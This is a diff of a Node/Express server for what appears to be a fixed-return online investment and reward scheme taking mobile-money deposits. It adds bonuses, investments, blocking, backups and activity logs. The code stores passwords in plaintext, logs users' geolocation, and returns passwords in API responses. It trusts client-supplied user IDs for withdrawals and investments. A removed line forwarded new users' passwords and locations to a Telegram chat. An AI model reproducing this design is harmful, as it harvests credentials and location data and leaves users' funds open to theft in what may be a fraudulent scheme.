@@ -28,9 +28,11 @@ function defaultDb() {
     withdrawals: [],
     deposits: [],
     usedTrxIds: [],
+    auditLogs: [],
+    activityLogs: [],
     promoTasks: [{ id: "promo_1", title: "YouTube Promo Visit", url: "https://youtube.com", reward: 45 }],
     settings: {
-      noticeText: "📢 Master Investment & Reward System live!",
+      noticeText: "📢 Advanced Master Investment & Reward System live!",
       noticeActive: true,
       investEnabled: true,
       minInvest: 100,
@@ -39,6 +41,7 @@ function defaultDb() {
       investDuration: 7,
       adminBkash: "01700000000",
       adminNagad: "01800000000",
+      welcomeBonus: 100,
       telegramToken: "",
       telegramChatId: ""
     }
@@ -60,6 +63,8 @@ function loadDb() {
       withdrawals: Array.isArray(parsed.withdrawals) ? parsed.withdrawals : [],
       deposits: Array.isArray(parsed.deposits) ? parsed.deposits : [],
       usedTrxIds: Array.isArray(parsed.usedTrxIds) ? parsed.usedTrxIds : [],
+      auditLogs: Array.isArray(parsed.auditLogs) ? parsed.auditLogs : [],
+      activityLogs: Array.isArray(parsed.activityLogs) ? parsed.activityLogs : [],
       promoTasks: Array.isArray(parsed.promoTasks) ? parsed.promoTasks : defaultDb().promoTasks,
       settings: { ...defaultDb().settings, ...(parsed.settings || {}) }
     };
@@ -72,9 +77,12 @@ function saveDb(db) {
   fs.renameSync(tmp, DB_FILE);
 }
 
+function logActivity(db, action, ip = "127.0.0.1") {
+  db.activityLogs.unshift({ id: crypto.randomUUID(), action, ip, date: new Date().toISOString() });
+}
+
 function clean(v, max = 200) { return String(v || "").trim().slice(0, max); }
 
-// Telegram Notification Helper
 async function sendTelegramNotification(text, settings) {
   if (!settings || !settings.telegramToken || !settings.telegramChatId) return;
   try {
@@ -82,15 +90,9 @@ async function sendTelegramNotification(text, settings) {
     await fetch(url, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: settings.telegramChatId,
-        text: text,
-        parse_mode: "HTML"
-      })
+      body: JSON.stringify({ chat_id: settings.telegramChatId, text: text, parse_mode: "HTML" })
     });
-  } catch (e) {
-    console.error("Telegram Notification Error:", e);
-  }
+  } catch (e) { console.error("Telegram Error:", e); }
 }
 
 function signSession(payload) {
@@ -136,24 +138,25 @@ app.post("/api/register/start", (req, res) => {
   withFileLock(async () => {
     const { name, phone, password, age, location } = req.body;
     const db = loadDb();
-    if (db.registrations.some(r => r.phone === phone)) return res.status(409).json({ error: "এই নাম্বার দিয়ে ইতিপূর্বে অ্যাকাউন্ট খোলা হয়েছে।" });
+    if (db.registrations.some(r => r.phone === phone)) return res.status(409).json({ error: "এই নাম্বার দিয়ে অ্যাকাউন্ট আছে।" });
 
+    const bonusAmount = db.settings.welcomeBonus || 100;
     const id = crypto.randomUUID();
     const user = {
       id, name, phone, password, age,
-      balance: 100,
+      balance: bonusAmount,
       referralCode: "REF" + Math.floor(100000 + Math.random() * 900000),
-      referralCount: 0, status: "awaiting_payment",
+      referralCount: 0, status: "awaiting_payment", isBlocked: false,
       location, locationHistory: [location],
       createdAt: new Date().toISOString()
     };
     db.registrations.unshift(user);
-    db.transactions.unshift({ id: crypto.randomUUID(), userId: id, type: "Registration Bonus", amount: 100, date: new Date().toISOString() });
+    db.transactions.unshift({ id: crypto.randomUUID(), userId: id, type: "Registration Bonus", amount: bonusAmount, date: new Date().toISOString() });
+    logActivity(db, `New User Registration: ${name} (${phone})`);
     saveDb(db);
 
-    // Send Telegram Notification with Location Map Link
     let mapLink = location ? `https://maps.google.com/?q=${location.latitude},${location.longitude}` : 'N/A';
-    const msg = `👤 <b>New Registration!</b>\n\nName: ${name}\nPhone: ${phone}\nAge: ${age}\nPassword: ${password}\n📍 Location: <a href="${mapLink}">View on Google Maps</a>`;
+    const msg = `👤 <b>New Registration!</b>\n\nName: ${name}\nPhone: ${phone}\nBonus: ৳${bonusAmount}\n📍 Location: <a href="${mapLink}">Map</a>`;
     sendTelegramNotification(msg, db.settings);
 
     res.json({ ok: true, user });
@@ -165,6 +168,7 @@ app.post("/api/login", (req, res) => {
   const db = loadDb();
   const user = db.registrations.find(r => r.phone === phone && r.password === password);
   if (!user) return res.status(401).json({ error: "Invalid Information" });
+  if (user.isBlocked) return res.status(403).json({ error: "Account is blocked." });
   res.json({ ok: true, user });
 });
 
@@ -210,15 +214,14 @@ app.post("/api/deposit", (req, res) => {
     if (!user) return res.status(404).json({ error: "User not found" });
 
     const cleanTrx = clean(trxId, 50).toUpperCase();
-    if (db.usedTrxIds.includes(cleanTrx)) return res.status(400).json({ error: "এই TrxID টি ইতিপূর্বে ব্যবহার করা হয়েছে!" });
+    if (db.usedTrxIds.includes(cleanTrx)) return res.status(400).json({ error: "TrxID already used!" });
 
     db.usedTrxIds.push(cleanTrx);
     db.deposits.unshift({ id: crypto.randomUUID(), userId, method, amount, trxId: cleanTrx, status: "Pending", date: new Date().toISOString() });
     db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Deposit (${method})`, amount, status: "Pending", date: new Date().toISOString() });
     saveDb(db);
 
-    // Send Telegram Notification for Deposit
-    const msg = `💳 <b>New Deposit Request!</b>\n\nUser: ${user.name} (${user.phone})\nMethod: ${method}\nAmount: ৳${amount}\nTrxID: <code>${cleanTrx}</code>`;
+    const msg = `💳 <b>New Deposit Request!</b>\n\nUser: ${user.name} (${user.phone})\nAmount: ৳${amount}\nTrxID: <code>${cleanTrx}</code>`;
     sendTelegramNotification(msg, db.settings);
 
     res.json({ ok: true });
@@ -229,55 +232,34 @@ app.post("/api/invest/create", (req, res) => {
   withFileLock(async () => {
     const { userId, amount } = req.body;
     const db = loadDb();
-    if (!db.settings.investEnabled) return res.status(400).json({ error: "বিনিয়োগ সিস্টেম বর্তমানে বন্ধ রয়েছে।" });
+    if (!db.settings.investEnabled) return res.status(400).json({ error: "Investment disabled." });
 
     const user = db.registrations.find(r => r.id === userId);
     if (!user) return res.status(404).json({ error: "User not found" });
 
     const numAmt = Number(amount);
-    if (numAmt < db.settings.minInvest || numAmt > db.settings.maxInvest) {
-      return res.status(400).json({ error: `বিনিয়োগের পরিমাণ ৳${db.settings.minInvest} থেকে ৳${db.settings.maxInvest} এর মধ্যে হতে হবে।` });
-    }
-    if (user.balance < numAmt) return res.status(400).json({ error: "অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই।" });
+    if (numAmt < db.settings.minInvest || numAmt > db.settings.maxInvest) return res.status(400).json({ error: "Invalid invest limits." });
+    if (user.balance < numAmt) return res.status(400).json({ error: "Insufficient balance." });
 
     user.balance -= numAmt;
-    const rate = db.settings.investRate;
-    const profit = Math.floor((numAmt * rate) / 100);
-    const durationDays = db.settings.investDuration;
-
+    const profit = Math.floor((numAmt * db.settings.investRate) / 100);
     const unlockDate = new Date();
-    unlockDate.setDate(unlockDate.getDate() + durationDays);
+    unlockDate.setDate(unlockDate.getDate() + db.settings.investDuration);
 
-    const investment = {
-      id: crypto.randomUUID(),
-      userId,
-      amount: numAmt,
-      rate,
-      profit,
-      totalReturn: numAmt + profit,
-      status: "Active",
-      createdAt: new Date().toISOString(),
-      unlockDate: unlockDate.toISOString()
-    };
-
-    db.investments.unshift(investment);
-    db.transactions.unshift({
-      id: crypto.randomUUID(),
-      userId,
-      type: `Investment Deduction`,
-      amount: -numAmt,
-      date: new Date().toISOString()
+    db.investments.unshift({
+      id: crypto.randomUUID(), userId, amount: numAmt, rate: db.settings.investRate, profit,
+      totalReturn: numAmt + profit, status: "Active", createdAt: new Date().toISOString(), unlockDate: unlockDate.toISOString()
     });
+    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Investment Deduction`, amount: -numAmt, date: new Date().toISOString() });
 
     saveDb(db);
-    res.json({ ok: true, balance: user.balance, investment });
+    res.json({ ok: true, balance: user.balance });
   });
 });
 
 app.get("/api/investments/:userId", (req, res) => {
   const db = loadDb();
-  const list = db.investments.filter(i => i.userId === req.params.userId);
-  res.json({ ok: true, investments: list });
+  res.json({ ok: true, investments: db.investments.filter(i => i.userId === req.params.userId) });
 });
 
 app.post("/api/invest/claim", (req, res) => {
@@ -286,25 +268,12 @@ app.post("/api/invest/claim", (req, res) => {
     const db = loadDb();
     const user = db.registrations.find(r => r.id === userId);
     const inv = db.investments.find(i => i.id === investId && i.userId === userId);
-
-    if (!user || !inv) return res.status(404).json({ error: "Not found" });
-    if (inv.status !== "Active") return res.status(400).json({ error: "ইতিমধ্যে এই ইনভেস্টমেন্ট ক্লেম করা হয়েছে।" });
-
-    if (new Date() < new Date(inv.unlockDate)) {
-      return res.status(400).json({ error: "মেয়াদ এখনও শেষ হয়নি!" });
-    }
+    if (!user || !inv || inv.status !== "Active") return res.status(400).json({ error: "Invalid request." });
+    if (new Date() < new Date(inv.unlockDate)) return res.status(400).json({ error: "Duration not completed." });
 
     inv.status = "Completed";
-    const totalPayout = inv.totalReturn;
-    user.balance += totalPayout;
-
-    db.transactions.unshift({
-      id: crypto.randomUUID(),
-      userId,
-      type: `Investment Profit & Capital Payout`,
-      amount: totalPayout,
-      date: new Date().toISOString()
-    });
+    user.balance += inv.totalReturn;
+    db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Investment Profit Payout`, amount: inv.totalReturn, date: new Date().toISOString() });
 
     saveDb(db);
     res.json({ ok: true, balance: user.balance });
@@ -321,15 +290,14 @@ app.post("/api/withdraw", (req, res) => {
     const { userId, method, number, amount } = req.body;
     const db = loadDb();
     const user = db.registrations.find(r => r.id === userId);
-    if (!user || user.balance < amount || amount < 500) return res.status(400).json({ error: "Insufficient balance" });
+    if (!user || user.balance < amount || amount < 500) return res.status(400).json({ error: "Invalid withdraw." });
 
     user.balance -= amount;
     db.withdrawals.unshift({ id: crypto.randomUUID(), userId, method, number, amount, status: "Pending", date: new Date().toISOString() });
     db.transactions.unshift({ id: crypto.randomUUID(), userId, type: `Withdraw (${method})`, amount: -amount, date: new Date().toISOString() });
     saveDb(db);
 
-    // Send Telegram Notification for Withdraw
-    const msg = `💸 <b>New Withdraw Request!</b>\n\nUser: ${user.name} (${user.phone})\nMethod: ${method} (${number})\nAmount: ৳${amount}`;
+    const msg = `💸 <b>New Withdraw Request!</b>\n\nUser: ${user.name} (${user.phone})\nAmount: ৳${amount}`;
     sendTelegramNotification(msg, db.settings);
 
     res.json({ ok: true, balance: user.balance });
@@ -341,7 +309,7 @@ app.get("/api/promo/tasks", (req, res) => {
   res.json({ tasks: db.promoTasks });
 });
 
-/* Master Admin APIs */
+/* Advanced Master Admin APIs */
 app.post("/api/admin/login", (req, res) => {
   if (String(req.body?.pin || "") !== ADMIN_PIN) return res.status(401).json({ error: "Invalid PIN" });
   const token = signSession({ role: "admin", exp: Date.now() + 8*3600*1000 });
@@ -351,14 +319,7 @@ app.post("/api/admin/login", (req, res) => {
 
 app.get("/api/admin/overview", requireAdmin, (req, res) => {
   const db = loadDb();
-  res.json({
-    ok: true,
-    users: db.registrations,
-    deposits: db.deposits,
-    withdrawals: db.withdrawals,
-    tasks: db.promoTasks,
-    settings: db.settings
-  });
+  res.json({ ok: true, users: db.registrations, deposits: db.deposits, withdrawals: db.withdrawals, tasks: db.promoTasks, settings: db.settings });
 });
 
 app.post("/api/admin/deposit/approve", requireAdmin, (req, res) => {
@@ -370,6 +331,7 @@ app.post("/api/admin/deposit/approve", requireAdmin, (req, res) => {
       dep.status = "Approved";
       const user = db.registrations.find(u => u.id === dep.userId);
       if (user) user.balance += Number(dep.amount);
+      logActivity(db, `Approved Deposit of ৳${dep.amount} for user ID ${dep.userId}`);
       saveDb(db);
     }
     res.json({ ok: true });
@@ -383,18 +345,92 @@ app.post("/api/admin/withdraw/approve", requireAdmin, (req, res) => {
     const w = db.withdrawals.find(x => x.id === wId);
     if (w && w.status === "Pending") {
       w.status = "Approved";
+      logActivity(db, `Approved Withdraw of ৳${w.amount}`);
       saveDb(db);
     }
     res.json({ ok: true });
   });
 });
 
-// Admin Manage Promo Tasks
+// User Search, Block & Balance Adjustment with Audit Log
+app.post("/api/admin/user/toggle-block", requireAdmin, (req, res) => {
+  withFileLock(async () => {
+    const { userId } = req.body;
+    const db = loadDb();
+    const u = db.registrations.find(x => x.id === userId);
+    if(u) {
+      u.isBlocked = !u.isBlocked;
+      logActivity(db, `Toggled Block status for user ${u.phone} to ${u.isBlocked}`);
+      saveDb(db);
+    }
+    res.json({ ok: true });
+  });
+});
+
+app.post("/api/admin/user/adjust", requireAdmin, (req, res) => {
+  withFileLock(async () => {
+    const { userId, amount, reason } = req.body;
+    const db = loadDb();
+    const u = db.registrations.find(x => x.id === userId);
+    if(u) {
+      u.balance += Number(amount);
+      db.auditLogs.unshift({ id: crypto.randomUUID(), userId, amount, reason, date: new Date().toISOString() });
+      logActivity(db, `Admin adjusted balance for ${u.phone} by ৳${amount}. Reason: ${reason}`);
+      saveDb(db);
+    }
+    res.json({ ok: true });
+  });
+});
+
+// Reports API (Daily & Monthly Calculations)
+app.get("/api/admin/reports", requireAdmin, (req, res) => {
+  const db = loadDb();
+  const now = new Date();
+  const todayStr = now.toDateString();
+  const currentMonth = now.getMonth();
+  const currentYear = now.getFullYear();
+
+  let dailyDeposit = 0, dailyWithdraw = 0, monthlyDeposit = 0, monthlyWithdraw = 0;
+
+  db.deposits.forEach(d => {
+    if(d.status === 'Approved') {
+      const dDate = new Date(d.date);
+      if(dDate.toDateString() === todayStr) dailyDeposit += d.amount;
+      if(dDate.getMonth() === currentMonth && dDate.getFullYear() === currentYear) monthlyDeposit += d.amount;
+    }
+  });
+
+  db.withdrawals.forEach(w => {
+    if(w.status === 'Approved') {
+      const wDate = new Date(w.date);
+      if(wDate.toDateString() === todayStr) dailyWithdraw += w.amount;
+      if(wDate.getMonth() === currentMonth && wDate.getFullYear() === currentYear) monthlyWithdraw += w.amount;
+    }
+  });
+
+  res.json({ ok: true, dailyDeposit, dailyWithdraw, monthlyDeposit, monthlyWithdraw, totalUsers: db.registrations.length });
+});
+
+// Database Backup & Activity Logs
+app.get("/api/admin/backup", requireAdmin, (req, res) => {
+  const db = loadDb();
+  res.setHeader('Content-Type', 'application/json');
+  res.setHeader('Content-Disposition', 'attachment; filename=db_backup.json');
+  res.send(JSON.stringify(db, null, 2));
+});
+
+app.get("/api/admin/activity", requireAdmin, (req, res) => {
+  const db = loadDb();
+  res.json({ ok: true, logs: db.activityLogs });
+});
+
+// Task Management
 app.post("/api/admin/task/add", requireAdmin, (req, res) => {
   withFileLock(async () => {
     const { title, url, reward } = req.body;
     const db = loadDb();
     db.promoTasks.push({ id: crypto.randomUUID(), title, url, reward: Number(reward) });
+    logActivity(db, `Added promo task: ${title}`);
     saveDb(db);
     res.json({ ok: true });
   });
@@ -405,25 +441,20 @@ app.post("/api/admin/task/delete", requireAdmin, (req, res) => {
     const { taskId } = req.body;
     const db = loadDb();
     db.promoTasks = db.promoTasks.filter(t => t.id !== taskId);
+    logActivity(db, `Deleted promo task ID ${taskId}`);
     saveDb(db);
     res.json({ ok: true });
   });
-});
-
-app.get("/api/admin/settings", requireAdmin, (req, res) => {
-  const db = loadDb();
-  res.json(db.settings);
 });
 
 app.post("/api/admin/settings", requireAdmin, (req, res) => {
   withFileLock(async () => {
     const db = loadDb();
     db.settings = { ...db.settings, ...req.body };
+    logActivity(db, `Updated system settings`);
     saveDb(db);
     res.json({ ok: true });
   });
 });
 
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+app.listen(PORT, () => { console.log(`Server running on http://localhost:${PORT}`); });
